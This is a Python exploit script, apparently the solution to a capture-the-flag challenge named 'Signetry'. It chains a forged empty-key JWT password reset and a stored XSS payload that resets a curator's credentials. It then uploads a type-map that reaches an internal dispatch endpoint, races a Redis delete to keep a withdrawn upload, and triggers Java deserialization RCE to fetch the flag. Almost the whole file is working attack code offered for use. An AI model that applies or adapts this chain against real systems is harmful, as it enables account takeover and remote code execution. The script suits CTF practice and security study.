#!/usr/bin/env python3
import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
from pathlib import Path

import requests


MAINTAINER = "dms@htb.com"
CURATOR = "conservator@htb.com"
MAINTAINER_PASSWORD = "StormboundRealm2026!"
CURATOR_PASSWORD = "LivingRealm2026!"
LOOT_NAME = "garran-oath.txt"


def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def reset_token():
    header = b64url(json.dumps(
        {"alg": "HS256", "typ": "JWT"}, separators=(",", ":")
    ).encode())
    payload = b64url(json.dumps(
        {"jti": MAINTAINER}, separators=(",", ":")
    ).encode())
    message = f"{header}.{payload}".encode()
    signature = b64url(hmac.new(b"", message, hashlib.sha256).digest())
    return f"{header}.{payload}.{signature}"


def expect(response, statuses, action):
    if response.status_code not in statuses:
        raise RuntimeError(
            f"{action}: HTTP {response.status_code}: {response.text[:500]}"
        )
    return response


def login(base, username, password):
    session = requests.Session()
    response = session.post(
        base + "/api/login",
        json={"login": username, "password": password},
        timeout=10,
    )
    if response.status_code != 200:
        return None
    return session


def main():
    parser = argparse.ArgumentParser(description="Signetry exploit")
    parser.add_argument("url", help="challenge base URL, e.g. http://host:1337")
    parser.add_argument(
        "--model",
        type=Path,
        default=Path(__file__).with_name("evil-model.zip"),
        help="malicious model archive",
    )
    args = parser.parse_args()

    base = args.url.rstrip("/")
    model = args.model.read_bytes()

    print("[1] Resetting the maintainer password with the empty-key QOR JWT")
    response = requests.post(
        base + "/auth/password/update",
        json={
            "reset_password_token": reset_token(),
            "new_password": MAINTAINER_PASSWORD,
        },
        timeout=10,
    )
    expect(response, {200}, "maintainer password reset")

    maintainer = login(base, MAINTAINER, MAINTAINER_PASSWORD)
    if maintainer is None:
        raise RuntimeError("maintainer login failed")

    print("[2] Planting the stored XSS used to reset the curator")
    xss = (
        '<img is="x-img" src="/missing-warden-image" '
        'onerror="fetch(\'/admin/credential/reset\',{method:\'POST\','
        "headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({uid:'conservator@htb.com',"
        "new_password:'LivingRealm2026!'})})\">"
    )
    response = maintainer.post(
        base + "/api/appeals", json={"body": xss}, timeout=10
    )
    expect(response, {200}, "appeal submission")

    print("[3] Uploading a type-map and dispatching the same-origin warden")
    typemap = (
        "URI: ../internal/dispatch\n"
        "Content-Type: application/json; qs=1.0\n"
        "Content-Language: en\n\n"
    )
    response = maintainer.post(
        base + "/api/attachments",
        params={"name": "dispatch.var"},
        data=typemap.encode(),
        timeout=10,
    )
    expect(response, {200}, "type-map upload")
    response = requests.get(base + "/uploads/dispatch.var", timeout=10)
    expect(response, {200, 202}, "warden dispatch")

    curator = None
    for _ in range(20):
        time.sleep(1.5)
        curator = login(base, CURATOR, CURATOR_PASSWORD)
        if curator is not None:
            break
    if curator is None:
        raise RuntimeError("the warden did not reset the curator password")

    print("[4] Exploiting cross-shard DEL until a model is unsealed but retained")
    accepted = None
    for attempt in range(1, 41):
        response = maintainer.post(
            base + "/stage",
            data=model,
            headers={"Content-Type": "application/zip"},
            timeout=15,
        )
        expect(response, {200}, "model staging")
        token = response.json()["token"]

        response = maintainer.post(
            base + "/withdraw", json={"token": token}, timeout=10
        )
        expect(response, {200}, "model withdrawal")

        status = maintainer.get(
            base + "/api/versions/" + token, timeout=10
        ).json()
        if not status.get("exists"):
            print(f"    attempt {attempt}: blob was deleted")
            continue

        response = curator.post(
            base + "/finalize", json={"token": token}, timeout=30
        )
        print(
            f"    attempt {attempt}: retained blob, finalize HTTP "
            f"{response.status_code}"
        )
        if response.status_code == 202:
            accepted = token
            break
        if response.status_code not in {403, 404}:
            raise RuntimeError(
                f"unexpected finalize response: {response.status_code} "
                f"{response.text[:500]}"
            )

    if accepted is None:
        raise RuntimeError("failed to obtain the required Redis shard layout")

    print(f"[5] Model {accepted} queued; waiting for Java deserialization")
    for _ in range(20):
        time.sleep(1)
        response = requests.get(base + "/uploads/" + LOOT_NAME, timeout=10)
        if response.status_code == 200 and response.content:
            flag = response.text.strip()
            print(f"[+] {flag}")
            return

    raise RuntimeError("RCE ran late or did not publish the flag attachment")


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        sys.exit(1)
